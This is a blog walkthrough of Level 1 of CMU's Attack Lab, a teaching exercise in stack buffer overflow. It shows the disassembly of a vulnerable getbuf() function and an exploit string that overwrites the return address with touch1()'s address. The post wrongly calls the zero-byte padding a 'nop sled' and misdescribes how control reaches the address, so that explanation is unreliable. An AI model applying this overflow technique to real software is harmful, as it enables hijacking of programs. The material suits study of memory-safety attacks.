---
layout: post
title: Walkthrough of CMU's Attack Lab
---
This post walks through CMU's 'Attack' lab, which involves exploiting the stack space of vulnerable binaries.

## Post Outline
- [Level 1](#level-1)
- [Resources](#resources)

We go over Level 1 in this post.

## Level 1
From the assignment handout, we are told that there is a function `test()` that calls `getbuf()`. 
We want `getbuf()` to call `touch1()` in this first phase.
Let's start by disassembling the function `getbuf()`.

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp // allocate 0x28 bytes for getbuf
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets> // call Gets() function to get input
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

If we think conceptually about what is going on during this call, `%rsp` is currently inside of the memory space allocated for `test()`.
At the end of the space allocated for `test()` is the return address that `%rsp` will return to after calling `getbuf()`.
When we call `getbuf()`, we allocate more space on the stack just below `test()`.
Here is a visualization:
![_config.yml]({{ site.baseurl }}/images/CMUAttackLab/p1.jpeg)

From the disassembled code, we note that 0x28 (40) bytes are allocated.
This means that we can create a nop sled of 40 bytes (each nop is 1 byte) and then include the address of `touch1()`.
When `getbuf()` is called, `%rsp` will slide down the nop sled, encounter the address of `touch1()` and execute `touch1()`.

By disassembling `touch1()`, we can see that it's address is: `00000000004017c0 <touch1>:`.

Therefore, our resulting exploited code is the following (`touch1()`'s address is reversed b/c the machine is little endian).
```
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
00 00 00 00 00
c0 17 40 00 00
```

## Resources
- [Assignment Handout](http://csapp.cs.cmu.edu/3e/attacklab.pdf)